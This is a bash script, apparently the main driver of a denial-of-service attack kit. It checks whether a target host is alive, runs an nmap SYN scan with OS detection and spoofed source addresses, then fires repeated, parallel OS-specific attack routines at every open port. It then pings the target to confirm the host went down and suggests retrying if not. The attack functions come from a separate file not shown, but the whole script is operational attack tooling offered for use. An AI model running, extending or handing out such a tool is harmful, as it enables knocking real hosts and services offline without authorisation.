#!/bin/bash
if [ ! -f ./datapool.fc ]; then
    echo "Dude, wtf were u thinking?? Don't delete datapool.fc dumbass!!!"
    exit 1
fi

. ./datapool.fc

clear

ATTACKNM=
SIMULT=1
DONTSTOP=0
SCANONLY=0
LINESPEED=1
WATCHCON=0
SEXYRAN=0
COUNTER1=1
LOGFILE=
PORTLIST=
KEEPGOING=0
trap "rm -f ./output.txt ; rm -f ./svcname.txt ; rm -f ./output2.txt ; rm -f ./datapool.bk ; ./cleaner.sh 1 ; exit 1" 1 2 3 15

if [ $# -lt 2 ]; then
    usage
fi

while getopts r:t:p:v:d:i:l:xskac OPTION ; do
    case "$OPTION" in
    p) PORTLIST="$OPTARG" ;;
    v) LOGFILE="$OPTARG" ;;
    x) DONTSTOP=1 ;;
    r) ATTACKNM="$OPTARG" ;;
    a) LOOPING=1 ;;
    d) DESTIP="$OPTARG" ;;
    i) SRCIP="$OPTARG" ;;
    c) KEEPGOING=1 ; DONTSTOP=1 ;;
    t) SIMULT="$OPTARG" ;;
    s) SCANONLY=1 ;;
    l) case "$OPTARG" in
	T1) LINESPEED=2 ;;
	T3) LINESPEED=4 ;;
	OC3) LINESPEED=6 ;;
	Slowass) LINESPEED="1 / 2" ;;
	Modem) LINESPEED=1 ;;
       esac ;;
    k) WATCHCON=1 ;;
   \?) usage ;;
   esac
done


cleaner

if [ -z "$DESTIP" ]; then
    usage
fi

nmapcheck

portchg

nfo

srcipgen

optionlist

if [ $WATCHCON -eq 0 ]; then
    if [ $KEEPGOING -eq 0 ]; then
    echo "Checking to see if $DESTIP is alive ..."
    ping -c3 $DESTIP 1> ./output.txt 2>./output.txt
    ping1=`cat ./output.txt | grep "unknown host" -w`
    if [ -n "$ping1" ]; then
	rm -f ./output.txt
	echo "Invalid host...exiting."
	exit 9
    fi 
    ping=`cat ./output.txt | grep "100%" -w `
    rm -f ./output.txt
    if [ "$ping" = "3 packets transmitted, 0 packets received, 100% packet loss" ]; then
        echo "Host is unavailable, exiting..."
	if [ -n "$LOGFILE" ]; then
	    echo "-----------------------------" >> "$LOGFILE"
	fi
	exit 2
    else
        echo "Host is alive, starting portscan..."
    fi
    else
	echo "Starting portstan..."
    fi
else
    echo "Watching connection..."
    HOSTFOUND=0
    while [ $HOSTFOUND -eq 0 ]; do
        ping=`ping -c2 $DESTIP | grep 100%`
	if [ "$ping" = "2 packets transmitted, 0 packets received, 100% packet loss" ]; then
	    printf "."
	else
            echo "Host is alive, starting portscan..."
	    if [ -n "$LOGFILE" ]; then
	        echo "$DESTIP" >> "$LOGFILE"
	    fi
	    HOSTFOUND=1
	fi
	sleep 5
    done
fi

case "$LINESPEED" in
"1 / 2")
    "$NMAPDIR" -sS -P0 -O -T Polite -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;
1)
    "$NMAPDIR" -sS -P0 -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;
2)
    "$NMAPDIR" -sS -P0 -T Aggressive -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;
4|6)
    "$NMAPDIR" -sS -P0 -T Insane -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;
esac

ipcalc $DESTIP 1>/dev/null 2>/dev/null
if [ $? = 1 ]; then
    HOSTERR=`cat ./output.txt | grep "No ports open for host" -w`
    if [ -z "$HOSTERR" ]; then
	DESTIP1=`cat ./output.txt | grep "Interesting ports on" -w | cut -d\( -f2 | cut -d\) -f1`
	echo "$DESTIP resolved to $DESTIP1"
	DESTIP=$DESTIP1
    else
	DESTIP1=`cat ./output.txt | grep "No ports open for host" -w | cut -d\( -f2 | cut -d\) -f1`
	echo "$DESTIP resolved to $DESTIP1"
	DESTIP=$DESTIP1
    fi
else
    HOSTERR=`cat ./output.txt | grep "No ports open for host" -w`
    if [ -z "$HOSTERR" ]; then
	DESTIP1=`cat ./output.txt | grep "Interesting ports on" -w | cut -b22- | cut -d\( -f1`
	echo "$DESTIP resolved to $DESTIP1"
    else
	DESTIP1=`cat ./output.txt | grep "No ports open for host" -w | cut -b24- | cut -d\( -f1`
	echo "$DESTIP resolved to $DESTIP1"
    fi
fi 

OS=`cat ./output.txt | grep "Remote operating system" -w`
cat ./output.txt| grep open -w | grep /tcp > ./output.txt
cat ./output.txt | cut -b24- > ./svcname.txt
cat ./output.txt | cut -d/ -f1 > ./output.txt
OUTPUT=`cat ./output.txt -n | grep 1 -w | cut -b8-`
if [ -z "$OUTPUT" ]; then
    echo "No ports found."
    if [ -n "$LOGFILE" ]; then
	echo "No Ports" >> "$LOGFILE"
    fi
    if [ -f ./svcname.txt ]; then
        rm -f ./svcname.txt
    fi
    if [ -f ./output2.txt ]; then
	rm -f ./output2.txt
    fi
    while true ; do
    if [ $COUNTER1 -eq 2 ]; then
    if [ $KEEPGOING -eq 0 ]; then
        echo "Attack Complete!"
        echo "Checking to see if $DESTIP is still alive ..."
        ping=`ping -c3 $DESTIP | grep 100%`
	if [ "$ping" = "3 packets transmitted, 0 packets received, 100% packet loss" ]; then
            dropcheck
        else
	    if [ $DONTSTOP -eq 1 ]; then
	        COUNTER1=0
    	    else
		echo "He's still alive=\ You might wanna try again..."
		if [ -n "$LOGFILE" ]; then
		    echo "-----------------------------" >> "$LOGFILE"
		fi
    		./cleaner.sh 5
		exit 5
	    fi
	fi
    else
    COUNTER1=0
    fi
    else 
	echo "Launching $SIMULT attack(s) at $DESTIP"
	x5=1
	while [ $x5 -le $SIMULT ]; do
    	if [ $x5 -eq $SIMULT ]; then
	if [ -z "$ATTACKNM" ]; then
	NoPorts
	else
	$ATTACKNM
	fi
	else
	if [ -z "$ATTACKNM" ]; then
	NoPorts 1>/dev/null 2>&1 &
	else
	$ATTACKNM 1>/dev/null 2>&1 &
	fi
	fi
	x5=`expr $x5 + 1`
	done
    fi    
    COUNTER1=`expr $COUNTER1 + 1`
    done     	 
fi
OSCHECK=`echo "$OS" | grep "Windows"`
if [ -z "$OSCHECK" ]; then
    OSCHECK=`echo "$OS" | grep Linux`
    if [ -z "$OSCHECK" ]; then
	OSCHECK=`echo "$OS" | grep BSD`
        if [ -z "$OSCHECK" ]; then
	    OS="All"
	else
	    OS="BSD"
	fi
    else
	OS="Linux"
    fi
else
    OS="Windows 9x"
fi
if [ -n "$LOGFILE" ]; then
    echo "$OS" >> "$LOGFILE"
fi
i=1
while read LINE
do
    cat ./svcname.txt -n | grep $i -w | cut -b8- > ./output3.txt
    TESTING=`cat ./output3.txt | wc -l | cut -b7-`
    if [ $TESTING -ne 1 ]; then
        x=1
	while read LINE3
        do
	    if [ $x -eq 1 ]; then
		LINE2="$LINE3"
	    fi
	    x=`expr $x + 1`
	done < "./output3.txt"
    else
	LINE2=`cat ./output3.txt`
    fi
    rm ./output3.txt
    echo "$LINE/$LINE2" >> ./output2.txt
    i=`expr $i + 1`
done < "./output.txt"
cat ./output2.txt > ./output.txt
rm -f ./output2.txt
rm -f ./svcname.txt

NUMPORTS=`cat ./output.txt | wc -l | cut -b-8`
OUTPUTLIST=`cat ./output.txt`
if [ -n "$LOGFILE" ]; then
    echo "Open ports:" >> "$LOGFILE"
    echo "$OUTPUTLIST" >> "$LOGFILE"
fi
case $OS in
    "Linux") echo "Linux host detected..." ;;
    "Windows 9x") echo "Windows 9x/NT/2000 host detected..." ;;
    "BSD") echo "BSD host detected..." ;;
    "All") echo "OS could not be detected. Running all attacks..." ;;
esac    

NUMPORTS=`echo $NUMPORTS `
echo "$NUMPORTS TCP port(s) were found open:"
echo "$OUTPUTLIST"
if [ $SCANONLY -eq 1 ]; then
    echo "Scan of $DESTIP complete."
    if [ -n "$LOGFILE" ]; then
	echo "-----------------------------" >> "$LOGFILE"
    fi
    exit 4
fi

while true ; do

    OUTPUT=`cat ./output.txt -n | grep $COUNTER1 -w | cut -b8- | cut -d/ -f1`
    if [ -z "$OUTPUT" ]; then
	if [ $DONTSTOP -eq 1 ]; then
	    DONTSTOPPER
        fi
    fi

    if [ -z "$OUTPUT" ]; then
	echo "Attack Complete!"
        echo "Checking to see if $DESTIP is still alive ..."
        ping=`ping -c3 $DESTIP | grep 100%`
	        
	if [ "$ping" = "3 packets transmitted, 0 packets received, 100% packet loss" ]; then
	    dropcheck
        else
	    echo "He's still alive=\ You might wanna try again..."
	    if [ -n "$LOGFILE" ]; then
		echo "-----------------------------" >> "$LOGFILE"
	    fi
	    ./cleaner.sh 5
	    exit 5
	fi
    else 
        echo "Launching $SIMULT attack(s) at $DESTIP on port: $OUTPUT"
	x5=1
	while [ $x5 -le $SIMULT ]; do
	if [ $x5 -eq $SIMULT ]; then
	if [ -z "$ATTACKNM" ]; then
	case $OS in
	    "Linux") LinuxAttack ;;
	    "Windows 9x") WinAttack ;;
	    "BSD") BSDAttack ;;
    	    "All") FullAttack ;;
	esac
	else
	$ATTACKNM
	fi
	else
	if [ -z "$ATTACKNM" ]; then
	case $OS in
	    "Linux") LinuxAttack 1>/dev/null 2>&1 &;;
	    "Windows 9x") WinAttack 1>/dev/null 2>&1 &;;
	    "BSD") BSDAttack 1>/dev/null 2>&1 &;;
    	    "All") FullAttack 1>/dev/null 2>&1 &;;
	esac
	else
	$ATTACKNM 1>/dev/null 2>&1 &
	fi
	fi
	x5=`expr $x5 + 1`
	done    
    fi    
    	
    COUNTER1=`expr $COUNTER1 + 1`
done     	 
